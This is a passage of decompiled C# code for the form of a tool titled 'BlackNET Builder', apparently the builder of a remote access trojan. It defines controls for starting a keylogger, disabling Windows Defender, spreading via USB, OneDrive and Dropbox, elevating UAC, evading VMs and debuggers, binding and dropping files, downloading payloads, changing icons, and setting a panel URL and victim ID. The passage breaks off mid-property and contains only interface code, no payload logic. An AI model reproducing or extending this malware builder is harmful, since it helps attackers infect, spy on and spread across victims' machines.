      this.Extra.Controls.Add((Control) this.BypassVM);
      this.Extra.Controls.Add((Control) this.EnableAES);
      this.Extra.Controls.Add((Control) this.OnedriveSpread);
      this.Extra.Controls.Add((Control) this.DropboxSpread);
      this.Extra.Controls.Add((Control) this.AntiDebugging);
      TabPage extra1 = this.Extra;
      point1 = new Point(119, 4);
      Point point34 = point1;
      extra1.Location = point34;
      this.Extra.Name = "Extra";
      TabPage extra2 = this.Extra;
      padding1 = new Padding(3);
      Padding padding4 = padding1;
      extra2.Padding = padding4;
      TabPage extra3 = this.Extra;
      size1 = new Size(372, 183);
      Size size38 = size1;
      extra3.Size = size38;
      this.Extra.TabIndex = 1;
      this.Extra.Text = "Extra Features";
      this.KeyloggerOnRun.Checked = false;
      NSCheckBox keyloggerOnRun1 = this.KeyloggerOnRun;
      point1 = new Point((int) sbyte.MaxValue, 64);
      Point point35 = point1;
      keyloggerOnRun1.Location = point35;
      this.KeyloggerOnRun.Name = "KeyloggerOnRun";
      NSCheckBox keyloggerOnRun2 = this.KeyloggerOnRun;
      size1 = new Size(125, 23);
      Size size39 = size1;
      keyloggerOnRun2.Size = size39;
      this.KeyloggerOnRun.TabIndex = 9;
      this.KeyloggerOnRun.Text = "Start Keylogger";
      this.DisableWD.Checked = false;
      NSCheckBox disableWd1 = this.DisableWD;
      point1 = new Point(252, 64);
      Point point36 = point1;
      disableWd1.Location = point36;
      this.DisableWD.Name = "DisableWD";
      NSCheckBox disableWd2 = this.DisableWD;
      size1 = new Size(96, 23);
      Size size40 = size1;
      disableWd2.Size = size40;
      this.DisableWD.TabIndex = 8;
      this.DisableWD.Text = "Disable WD";
      this.DebugMode.Checked = false;
      NSCheckBox debugMode1 = this.DebugMode;
      point1 = new Point(7, 90);
      Point point37 = point1;
      debugMode1.Location = point37;
      this.DebugMode.Name = "DebugMode";
      NSCheckBox debugMode2 = this.DebugMode;
      size1 = new Size(97, 23);
      Size size41 = size1;
      debugMode2.Size = size41;
      this.DebugMode.TabIndex = 7;
      this.DebugMode.Text = "Debug Mode";
      this.USBSpread.Checked = false;
      NSCheckBox usbSpread1 = this.USBSpread;
      point1 = new Point((int) sbyte.MaxValue, 35);
      Point point38 = point1;
      usbSpread1.Location = point38;
      this.USBSpread.Name = "USBSpread";
      NSCheckBox usbSpread2 = this.USBSpread;
      size1 = new Size(95, 23);
      Size size42 = size1;
      usbSpread2.Size = size42;
      this.USBSpread.TabIndex = 6;
      this.USBSpread.Text = "USB Spread";
      this.ElevateUAC.Checked = false;
      NSCheckBox elevateUac1 = this.ElevateUAC;
      point1 = new Point(252, 6);
      Point point39 = point1;
      elevateUac1.Location = point39;
      this.ElevateUAC.Name = "ElevateUAC";
      NSCheckBox elevateUac2 = this.ElevateUAC;
      size1 = new Size(97, 23);
      Size size43 = size1;
      elevateUac2.Size = size43;
      this.ElevateUAC.TabIndex = 5;
      this.ElevateUAC.Text = "Elevate UAC";
      this.BypassVM.Checked = false;
      NSCheckBox bypassVm1 = this.BypassVM;
      point1 = new Point(252, 35);
      Point point40 = point1;
      bypassVm1.Location = point40;
      this.BypassVM.Name = "BypassVM";
      NSCheckBox bypassVm2 = this.BypassVM;
      size1 = new Size(87, 23);
      Size size44 = size1;
      bypassVm2.Size = size44;
      this.BypassVM.TabIndex = 4;
      this.BypassVM.Text = "Bypass VM";
      this.EnableAES.Checked = false;
      NSCheckBox enableAes1 = this.EnableAES;
      point1 = new Point(7, 61);
      Point point41 = point1;
      enableAes1.Location = point41;
      this.EnableAES.Name = "EnableAES";
      NSCheckBox enableAes2 = this.EnableAES;
      size1 = new Size(123, 23);
      Size size45 = size1;
      enableAes2.Size = size45;
      this.EnableAES.TabIndex = 2;
      this.EnableAES.Text = "AES Encryption";
      this.OnedriveSpread.Checked = false;
      NSCheckBox onedriveSpread1 = this.OnedriveSpread;
      point1 = new Point((int) sbyte.MaxValue, 6);
      Point point42 = point1;
      onedriveSpread1.Location = point42;
      this.OnedriveSpread.Name = "OnedriveSpread";
      NSCheckBox onedriveSpread2 = this.OnedriveSpread;
      size1 = new Size(125, 23);
      Size size46 = size1;
      onedriveSpread2.Size = size46;
      this.OnedriveSpread.TabIndex = 0;
      this.OnedriveSpread.Text = "OneDrive Spread";
      this.DropboxSpread.Checked = false;
      NSCheckBox dropboxSpread1 = this.DropboxSpread;
      point1 = new Point(6, 6);
      Point point43 = point1;
      dropboxSpread1.Location = point43;
      this.DropboxSpread.Name = "DropboxSpread";
      NSCheckBox dropboxSpread2 = this.DropboxSpread;
      size1 = new Size(124, 23);
      Size size47 = size1;
      dropboxSpread2.Size = size47;
      this.DropboxSpread.TabIndex = 1;
      this.DropboxSpread.Text = "Dropbox Spread";
      this.AntiDebugging.Checked = false;
      NSCheckBox antiDebugging1 = this.AntiDebugging;
      point1 = new Point(6, 32);
      Point point44 = point1;
      antiDebugging1.Location = point44;
      this.AntiDebugging.Name = "AntiDebugging";
      NSCheckBox antiDebugging2 = this.AntiDebugging;
      size1 = new Size(124, 23);
      Size size48 = size1;
      antiDebugging2.Size = size48;
      this.AntiDebugging.TabIndex = 3;
      this.AntiDebugging.Text = "Anti-Debugging";
      this.Binder.BackColor = Color.FromArgb(50, 50, 50);
      this.Binder.Controls.Add((Control) this.DeleteFile);
      this.Binder.Controls.Add((Control) this.AddFile);
      this.Binder.Controls.Add((Control) this.DroperPath);
      this.Binder.Controls.Add((Control) this.NsLabel7);
      this.Binder.Controls.Add((Control) this.EnableBinder);
      this.Binder.Controls.Add((Control) this.FilesPaths);
      TabPage binder1 = this.Binder;
      point1 = new Point(119, 4);
      Point point45 = point1;
      binder1.Location = point45;
      this.Binder.Name = "Binder";
      TabPage binder2 = this.Binder;
      padding1 = new Padding(3);
      Padding padding5 = padding1;
      binder2.Padding = padding5;
      TabPage binder3 = this.Binder;
      size1 = new Size(372, 183);
      Size size49 = size1;
      binder3.Size = size49;
      this.Binder.TabIndex = 2;
      this.Binder.Text = "Binder Settings";
      this.DeleteFile.Enabled = false;
      NSButton deleteFile1 = this.DeleteFile;
      point1 = new Point(312, 156);
      Point point46 = point1;
      deleteFile1.Location = point46;
      this.DeleteFile.Name = "DeleteFile";
      NSButton deleteFile2 = this.DeleteFile;
      size1 = new Size(54, 23);
      Size size50 = size1;
      deleteFile2.Size = size50;
      this.DeleteFile.TabIndex = 5;
      this.DeleteFile.Text = "Del File";
      this.AddFile.Enabled = false;
      NSButton addFile1 = this.AddFile;
      point1 = new Point(248, 156);
      Point point47 = point1;
      addFile1.Location = point47;
      this.AddFile.Name = "AddFile";
      NSButton addFile2 = this.AddFile;
      size1 = new Size(58, 23);
      Size size51 = size1;
      addFile2.Size = size51;
      this.AddFile.TabIndex = 4;
      this.AddFile.Text = "Add File";
      this.DroperPath.BackColor = Color.FromArgb(50, 50, 50);
      this.DroperPath.DrawMode = DrawMode.OwnerDrawFixed;
      this.DroperPath.DropDownStyle = ComboBoxStyle.DropDownList;
      this.DroperPath.Enabled = false;
      this.DroperPath.ForeColor = Color.FromArgb(235, 235, 235);
      this.DroperPath.FormattingEnabled = true;
      this.DroperPath.Items.AddRange(new object[5]
      {
        (object) "Temp ",
        (object) "AppData",
        (object) "UserProfile",
        (object) "ProgramData",
        (object) "WinDir"
      });
      NSComboBox droperPath1 = this.DroperPath;
      point1 = new Point(55, 156);
      Point point48 = point1;
      droperPath1.Location = point48;
      this.DroperPath.Name = "DroperPath";
      NSComboBox droperPath2 = this.DroperPath;
      size1 = new Size(121, 21);
      Size size52 = size1;
      droperPath2.Size = size52;
      this.DroperPath.TabIndex = 3;
      this.NsLabel7.Font = new Font("Segoe UI", 8.25f);
      NSLabel nsLabel7_1 = this.NsLabel7;
      point1 = new Point(4, 155);
      Point point49 = point1;
      nsLabel7_1.Location = point49;
      this.NsLabel7.Name = "NsLabel7";
      NSLabel nsLabel7_2 = this.NsLabel7;
      size1 = new Size(75, 21);
      Size size53 = size1;
      nsLabel7_2.Size = size53;
      this.NsLabel7.TabIndex = 2;
      this.NsLabel7.Text = "NsLabel7";
      this.NsLabel7.Value1 = "Drop to: ";
      this.EnableBinder.Checked = false;
      NSCheckBox enableBinder1 = this.EnableBinder;
      point1 = new Point(6, 5);
      Point point50 = point1;
      enableBinder1.Location = point50;
      this.EnableBinder.Name = "EnableBinder";
      NSCheckBox enableBinder2 = this.EnableBinder;
      size1 = new Size(114, 23);
      Size size54 = size1;
      enableBinder2.Size = size54;
      this.EnableBinder.TabIndex = 1;
      this.EnableBinder.Text = "Enable Binder";
      this.FilesPaths.Columns = new NSListView.NSListViewColumnHeader[0];
      this.FilesPaths.Enabled = false;
      this.FilesPaths.Items = new NSListView.NSListViewItem[0];
      NSListView filesPaths1 = this.FilesPaths;
      point1 = new Point(6, 31);
      Point point51 = point1;
      filesPaths1.Location = point51;
      this.FilesPaths.MultiSelect = true;
      this.FilesPaths.Name = "FilesPaths";
      NSListView filesPaths2 = this.FilesPaths;
      size1 = new Size(360, 120);
      Size size55 = size1;
      filesPaths2.Size = size55;
      this.FilesPaths.TabIndex = 0;
      this.FilesPaths.Text = "NsListView1";
      this.Downloader.BackColor = Color.FromArgb(50, 50, 50);
      this.Downloader.Controls.Add((Control) this.DeleteLink);
      this.Downloader.Controls.Add((Control) this.AddLink);
      this.Downloader.Controls.Add((Control) this.DownloadPath);
      this.Downloader.Controls.Add((Control) this.NsLabel8);
      this.Downloader.Controls.Add((Control) this.EnableDownloader);
      this.Downloader.Controls.Add((Control) this.DownloadLinksView);
      TabPage downloader1 = this.Downloader;
      point1 = new Point(119, 4);
      Point point52 = point1;
      downloader1.Location = point52;
      this.Downloader.Name = "Downloader";
      TabPage downloader2 = this.Downloader;
      padding1 = new Padding(3);
      Padding padding6 = padding1;
      downloader2.Padding = padding6;
      TabPage downloader3 = this.Downloader;
      size1 = new Size(372, 183);
      Size size56 = size1;
      downloader3.Size = size56;
      this.Downloader.TabIndex = 3;
      this.Downloader.Text = "Downloader";
      this.DeleteLink.Enabled = false;
      NSButton deleteLink1 = this.DeleteLink;
      point1 = new Point(308, 156);
      Point point53 = point1;
      deleteLink1.Location = point53;
      this.DeleteLink.Name = "DeleteLink";
      NSButton deleteLink2 = this.DeleteLink;
      size1 = new Size(58, 23);
      Size size57 = size1;
      deleteLink2.Size = size57;
      this.DeleteLink.TabIndex = 11;
      this.DeleteLink.Text = "Del Link";
      this.AddLink.Enabled = false;
      NSButton addLink1 = this.AddLink;
      point1 = new Point(241, 156);
      Point point54 = point1;
      addLink1.Location = point54;
      this.AddLink.Name = "AddLink";
      NSButton addLink2 = this.AddLink;
      size1 = new Size(61, 23);
      Size size58 = size1;
      addLink2.Size = size58;
      this.AddLink.TabIndex = 10;
      this.AddLink.Text = "Add Link";
      this.DownloadPath.BackColor = Color.FromArgb(50, 50, 50);
      this.DownloadPath.DrawMode = DrawMode.OwnerDrawFixed;
      this.DownloadPath.DropDownStyle = ComboBoxStyle.DropDownList;
      this.DownloadPath.Enabled = false;
      this.DownloadPath.ForeColor = Color.FromArgb(235, 235, 235);
      this.DownloadPath.FormattingEnabled = true;
      this.DownloadPath.Items.AddRange(new object[5]
      {
        (object) "Temp ",
        (object) "AppData",
        (object) "UserProfile",
        (object) "ProgramData",
        (object) "WinDir"
      });
      NSComboBox downloadPath1 = this.DownloadPath;
      point1 = new Point(56, 156);
      Point point55 = point1;
      downloadPath1.Location = point55;
      this.DownloadPath.Name = "DownloadPath";
      NSComboBox downloadPath2 = this.DownloadPath;
      size1 = new Size(121, 21);
      Size size59 = size1;
      downloadPath2.Size = size59;
      this.DownloadPath.TabIndex = 9;
      this.NsLabel8.Font = new Font("Segoe UI", 8.25f);
      NSLabel nsLabel8_1 = this.NsLabel8;
      point1 = new Point(5, 156);
      Point point56 = point1;
      nsLabel8_1.Location = point56;
      this.NsLabel8.Name = "NsLabel8";
      NSLabel nsLabel8_2 = this.NsLabel8;
      size1 = new Size(75, 19);
      Size size60 = size1;
      nsLabel8_2.Size = size60;
      this.NsLabel8.TabIndex = 8;
      this.NsLabel8.Text = "NsLabel8";
      this.NsLabel8.Value1 = "Drop to: ";
      this.EnableDownloader.Checked = false;
      NSCheckBox enableDownloader1 = this.EnableDownloader;
      point1 = new Point(7, 6);
      Point point57 = point1;
      enableDownloader1.Location = point57;
      this.EnableDownloader.Name = "EnableDownloader";
      NSCheckBox enableDownloader2 = this.EnableDownloader;
      size1 = new Size(137, 23);
      Size size61 = size1;
      enableDownloader2.Size = size61;
      this.EnableDownloader.TabIndex = 7;
      this.EnableDownloader.Text = "Enable Downloader";
      this.DownloadLinksView.Columns = new NSListView.NSListViewColumnHeader[0];
      this.DownloadLinksView.Enabled = false;
      this.DownloadLinksView.Items = new NSListView.NSListViewItem[0];
      NSListView downloadLinksView1 = this.DownloadLinksView;
      point1 = new Point(7, 32);
      Point point58 = point1;
      downloadLinksView1.Location = point58;
      this.DownloadLinksView.MultiSelect = true;
      this.DownloadLinksView.Name = "DownloadLinksView";
      NSListView downloadLinksView2 = this.DownloadLinksView;
      size1 = new Size(360, 118);
      Size size62 = size1;
      downloadLinksView2.Size = size62;
      this.DownloadLinksView.TabIndex = 6;
      this.DownloadLinksView.Text = "NsListView2";
      this.ChangeIcon.BackColor = Color.FromArgb(50, 50, 50);
      this.ChangeIcon.Controls.Add((Control) this.CustomIconFromFile);
      this.ChangeIcon.Controls.Add((Control) this.CustomIcon);
      this.ChangeIcon.Controls.Add((Control) this.NoIcon);
      this.ChangeIcon.Controls.Add((Control) this.AddIconFromFile);
      this.ChangeIcon.Controls.Add((Control) this.IconPath);
      this.ChangeIcon.Controls.Add((Control) this.IconListView);
      TabPage changeIcon1 = this.ChangeIcon;
      point1 = new Point(119, 4);
      Point point59 = point1;
      changeIcon1.Location = point59;
      this.ChangeIcon.Name = "ChangeIcon";
      TabPage changeIcon2 = this.ChangeIcon;
      padding1 = new Padding(3);
      Padding padding7 = padding1;
      changeIcon2.Padding = padding7;
      TabPage changeIcon3 = this.ChangeIcon;
      size1 = new Size(372, 183);
      Size size63 = size1;
      changeIcon3.Size = size63;
      this.ChangeIcon.TabIndex = 4;
      this.ChangeIcon.Text = "Icon Changer";
      this.CustomIconFromFile.Checked = false;
      NSRadioButton customIconFromFile1 = this.CustomIconFromFile;
      point1 = new Point(198, 6);
      Point point60 = point1;
      customIconFromFile1.Location = point60;
      this.CustomIconFromFile.Name = "CustomIconFromFile";
      NSRadioButton customIconFromFile2 = this.CustomIconFromFile;
      size1 = new Size(157, 23);
      Size size64 = size1;
      customIconFromFile2.Size = size64;
      this.CustomIconFromFile.TabIndex = 7;
      this.CustomIconFromFile.Text = "Custom Icon From File";
      this.CustomIcon.Checked = false;
      NSRadioButton customIcon1 = this.CustomIcon;
      point1 = new Point(87, 6);
      Point point61 = point1;
      customIcon1.Location = point61;
      this.CustomIcon.Name = "CustomIcon";
      NSRadioButton customIcon2 = this.CustomIcon;
      size1 = new Size(105, 23);
      Size size65 = size1;
      customIcon2.Size = size65;
      this.CustomIcon.TabIndex = 6;
      this.CustomIcon.Text = "Custom Icon";
      this.NoIcon.Checked = false;
      NSRadioButton noIcon1 = this.NoIcon;
      point1 = new Point(6, 6);
      Point point62 = point1;
      noIcon1.Location = point62;
      this.NoIcon.Name = "NoIcon";
      NSRadioButton noIcon2 = this.NoIcon;
      size1 = new Size(75, 23);
      Size size66 = size1;
      noIcon2.Size = size66;
      this.NoIcon.TabIndex = 5;
      this.NoIcon.Text = "No Icon";
      NSButton addIconFromFile1 = this.AddIconFromFile;
      point1 = new Point(290, 153);
      Point point63 = point1;
      addIconFromFile1.Location = point63;
      this.AddIconFromFile.Name = "AddIconFromFile";
      NSButton addIconFromFile2 = this.AddIconFromFile;
      size1 = new Size(76, 23);
      Size size67 = size1;
      addIconFromFile2.Size = size67;
      this.AddIconFromFile.TabIndex = 4;
      this.AddIconFromFile.Text = "Select Icon";
      this.IconPath.Cursor = Cursors.IBeam;
      NSTextBox iconPath1 = this.IconPath;
      point1 = new Point(6, 153);
      Point point64 = point1;
      iconPath1.Location = point64;
      this.IconPath.MaxLength = (int) short.MaxValue;
      this.IconPath.Multiline = false;
      this.IconPath.Name = "IconPath";
      this.IconPath.ReadOnly = false;
      NSTextBox iconPath2 = this.IconPath;
      size1 = new Size(278, 23);
      Size size68 = size1;
      iconPath2.Size = size68;
      this.IconPath.TabIndex = 3;
      this.IconPath.Text = "Custom Icon Path";
      this.IconPath.TextAlign = HorizontalAlignment.Left;
      this.IconPath.UseSystemPasswordChar = false;
      this.IconListView.BackColor = Color.FromArgb(50, 50, 50);
      this.IconListView.BorderStyle = BorderStyle.FixedSingle;
      this.IconListView.ForeColor = SystemColors.Window;
      this.IconListView.LargeImageList = this.IconList;
      ListView iconListView1 = this.IconListView;
      point1 = new Point(6, 32);
      Point point65 = point1;
      iconListView1.Location = point65;
      this.IconListView.MultiSelect = false;
      this.IconListView.Name = "IconListView";
      ListView iconListView2 = this.IconListView;
      size1 = new Size(360, 115);
      Size size69 = size1;
      iconListView2.Size = size69;
      this.IconListView.Sorting = SortOrder.Ascending;
      this.IconListView.TabIndex = 2;
      this.IconListView.UseCompatibleStateImageBehavior = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(519, 261);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.BuilderTheme);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Main);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "BlackNET Builder";
      this.BuilderTheme.ResumeLayout(false);
      this.BuilderSettings.ResumeLayout(false);
      this.MainSettings.ResumeLayout(false);
      this.Persistence.ResumeLayout(false);
      this.Extra.ResumeLayout(false);
      this.Binder.ResumeLayout(false);
      this.Downloader.ResumeLayout(false);
      this.ChangeIcon.ResumeLayout(false);
      this.ResumeLayout(false);
    }

    internal virtual NSTheme BuilderTheme
    {
      get => this._BuilderTheme;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._BuilderTheme = value;
    }

    internal virtual NSTabControl BuilderSettings
    {
      get => this._BuilderSettings;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._BuilderSettings = value;
    }

    internal virtual TabPage MainSettings
    {
      get => this._MainSettings;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._MainSettings = value;
    }

    internal virtual TabPage Extra
    {
      get => this._Extra;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Extra = value;
    }

    internal virtual NSControlButton CloseSoftware
    {
      get => this._CloseSoftware;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CloseSoftware_Click);
        if (this._CloseSoftware != null)
          this._CloseSoftware.Click -= eventHandler;
        this._CloseSoftware = value;
        if (this._CloseSoftware == null)
          return;
        this._CloseSoftware.Click += eventHandler;
      }
    }

    internal virtual NSButton CompileClient
    {
      get => this._CompileClient;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CompileClient_Click);
        if (this._CompileClient != null)
          this._CompileClient.Click -= eventHandler;
        this._CompileClient = value;
        if (this._CompileClient == null)
          return;
        this._CompileClient.Click += eventHandler;
      }
    }

    internal virtual NSTextBox PanelURL
    {
      get => this._PanelURL;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._PanelURL = value;
    }

    internal virtual TabPage Binder
    {
      get => this._Binder;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Binder = value;
    }

    internal virtual NSListView FilesPaths
    {
      get => this._FilesPaths;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._FilesPaths = value;
    }

    internal virtual TabPage Downloader
    {
      get => this._Downloader;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Downloader = value;
    }

    internal virtual TabPage ChangeIcon
    {
      get => this._ChangeIcon;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ChangeIcon = value;
    }

    internal virtual NSTextBox VictimID
    {
      get => this._VictimID;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._VictimID = value;
    }

    internal virtual NSLabel NsLabel2
    {
      get => this._NsLabel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._NsLabel2 = value;
    }

    internal virtual NSButton CheckPanel
    {
      get => this._CheckPanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CheckPanel_Click);
        if (this._CheckPanel != null)
          this._CheckPanel.Click -= eventHandler;
        this._CheckPanel = value;
        if (this._CheckPanel == null)
          return;
        this._CheckPanel.Click += eventHandler;
      }
    }

    internal virtual NSLabel NsLabel1
    {
      get => this._NsLabel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._NsLabel1 = value;
    }

    internal virtual NSLabel NsLabel3
    {
      get => this._NsLabel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._NsLabel3 = value;
    }

    internal virtual NSTextBox DataSplitter
    {
      get => this._DataSplitter;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._DataSplitter = value;
    }

    internal virtual NSLabel NsLabel4
    {
      get => this._NsLabel4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._NsLabel4 = value;
    }

    internal virtual NSRandomPool MUTEX
    {
      get => this._MUTEX;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._MUTEX = value;
    }

    internal virtual TabPage Persistence
    {
      get => this._Persistence;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Persistence = value;
    }

    internal virtual ListView IconListView
    {
      get => this._IconListView;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.IconListView_SelectedIndexChanged);
        if (this._IconListView != null)
          this._IconListView.SelectedIndexChanged -= eventHandler;
        this._IconListView = value;
        if (this._IconListView == null)
          return;
        this._IconListView.SelectedIndexChanged += eventHandler;
      }
    }

    internal virtual NSComboBox InstallPath
    {
      get => this._InstallPath;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._InstallPath = value;
    }

    internal virtual NSCheckBox StealthMode
    {
      get => this._StealthMode;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        NSCheckBox.CheckedChangedEventHandler changedEventHandler = new NSCheckBox.CheckedChangedEventHandler(this.StealthMode_CheckedChanged);
        if (this._StealthMode != null)
          this._StealthMode.CheckedChanged -= changedEventHandler;
        this._StealthMode = value;
        if (this._StealthMode == null)
          return;
        this._StealthMode.CheckedChanged += changedEventHandler;
      }
    }

    internal virtual NSTextBox FileName
    {
      get => this._FileName;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._FileName = value;
    }

    internal virtual NSLabel NsLabel6
    {
      get => this._NsLabel6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._NsLabel6 = value;
    }

    internal virtual NSLabel NsLabel5
    {
      get => this._NsLabel5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._NsLabel5 = value;
    }

    internal virtual NSCheckBox Watchdog
    {
      get => this._Watchdog;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Watchdog = value;
    }

    internal virtual NSCheckBox DebugMode
    {
      get => this._DebugMode;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._DebugMode = value;
    }

    internal virtual NSCheckBox USBSpread
    {
      get => this._USBSpread;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._USBSpread = value;
    }

    internal virtual NSCheckBox ElevateUAC
    {
      get => this._ElevateUAC;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ElevateUAC = value;
    }

    internal virtual NSCheckBox BypassVM
    {
      get => this._BypassVM;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._BypassVM = value;
    }

    internal virtual NSCheckBox AntiDebugging
    {
      get => this._AntiDebugging;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._AntiDebugging = value;
    }

    internal virtual NSCheckBox EnableAES
    {
      get => this._EnableAES;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        NSCheckBox.CheckedChangedEventHandler changedEventHandler = new NSCheckBox.CheckedChangedEventHandler(this.EnableAES_CheckedChanged);
        if (this._EnableAES != null)
          this._EnableAES.CheckedChanged -= changedEventHandler;
        this._EnableAES = value;
        if (this._EnableAES == null)
          return;
        this._EnableAES.CheckedChanged += changedEventHandler;
      }
    }

    internal virtual NSCheckBox DropboxSpread
    {
      get => this._DropboxSpread;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._DropboxSpread = value;
    }

    internal virtual NSCheckBox OnedriveSpread
    {
      get => this._OnedriveSpread;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._OnedriveSpread = value;
    }

    internal virtual NSButton DeleteFile
    {
      get => this._DeleteFile;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DeleteFile_Click);
        if (this._DeleteFile != null)
          this._DeleteFile.Click -= eventHandler;
        this._DeleteFile = value;
        if (this._DeleteFile == null)
          return;
        this._DeleteFile.Click += eventHandler;
      }
    }

    internal virtual NSButton AddFile
    {
      get => this._AddFile;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.AddFile_Click);
        if (this._AddFile != null)
          this._AddFile.Click -= eventHandler;
        this._AddFile = value;
        if (this._AddFile == null)
          return;
        this._AddFile.Click += eventHandler;
      }
    }

    internal virtual NSComboBox DroperPath
    {
      get => this._DroperPath;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._DroperPath = value;
    }

    internal virtual NSLabel NsLabel7
    {
      get => this._NsLabel7;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._NsLabel7 = value;
    }

    internal virtual NSCheckBox EnableBinder
    {
      get => this._EnableBinder;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        NSCheckBox.CheckedChangedEventHandler changedEventHandler = new NSCheckBox.CheckedChangedEventHandler(this.EnableBinder_CheckedChanged);
        if (this._EnableBinder != null)
          this._EnableBinder.CheckedChanged -= changedEventHandler;
        this._EnableBinder = value;
        if (this._EnableBinder == null)
          return;
        this._EnableBinder.CheckedChanged += changedEventHandler;
      }
    }

    internal virtual NSButton DeleteLink
    {
      get => this._DeleteLink;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DeleteLink_Click);
        if (this._DeleteLink != null)
          this._DeleteLink.Click -= eventHandler;
        this._DeleteLink = value;
        if (this._DeleteLink == null)
          return;
        this._DeleteLink.Click += eventHandler;
      }
    }

    internal virtual NSButton AddLink
    {
      get => this._AddLink;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.AddLink_Click);
        if (this._AddLink != null)
          this._AddLink.Click -= eventHandler;
        this._AddLink = value;
        if (this._AddLink == null)
          return;
        this._AddLink.Click += eventHandler;
      }
    }

    internal virtual NSComboBox DownloadPath
    {
      get => this._DownloadPath;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._DownloadPath = value;
    }

    internal virtual NSLabel NsLabel8
    {
      get => this._NsLabel8;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._NsLabel8 = value;
    }

    internal virtual NSCheckBox EnableDownloader
    {
      get => this._EnableDownloader;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        NSCheckBox.CheckedChangedEventHandler changedEventHandler = new NSCheckBox.CheckedChangedEventHandler(this.EnableDownloader_CheckedChanged);
        if (this._EnableDownloader != null)
          this._EnableDownloader.CheckedChanged -= changedEventHandler;
        this._EnableDownloader = value;
        if (this._EnableDownloader == null)
          return;
        this._EnableDownloader.CheckedChanged += changedEventHandler;
      }
    }

    internal virtual NSListView DownloadLinksView
    {
      get => this._DownloadLinksView;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._DownloadLinksView = value;
    }

    internal virtual KachClazz PoweredBy
    {
      get => this._PoweredBy;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.PoweredBy_DoubleClick);
        if (this._PoweredBy != null)
          this._PoweredBy.DoubleClick -= eventHandler;
        this._PoweredBy = value;
        if (this._PoweredBy == null)
          return;
        this._PoweredBy.DoubleClick += eventHandler;
      }
    }

    internal virtual ImageList IconList
    {
      get => this._IconList;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._IconList = value;
    }

    internal virtual NSRadioButton CustomIconFromFile
    {
      get => this._CustomIconFromFile;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._CustomIconFromFile = value;
    }

    internal virtual NSRadioButton CustomIcon
    {
      get => this._CustomIcon;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._CustomIcon = value;
    }

    internal virtual NSRadioButton NoIcon
    {
      get => this._NoIcon;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._NoIcon = value;
    }

    internal virtual NSButton AddIconFromFile
    {
      get => this._AddIconFromFile;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.AddIconFromFile_Click);
        if (this._AddIconFromFile != null)
          this._AddIconFromFile.Click -= eventHandler;
        this._AddIconFromFile = value;
        if (this._AddIconFromFile == null)
          return;
        this._AddIconFromFile.Click += eventHandler;
      }
    }

    internal virtual NSTextBox IconPath
    {
      get => this._IconPath;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._IconPath = value;
    }

    internal virtual NSButton CheckForUpdate
    {
      get => this._CheckForUpdate;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CheckForUpdate_Click);
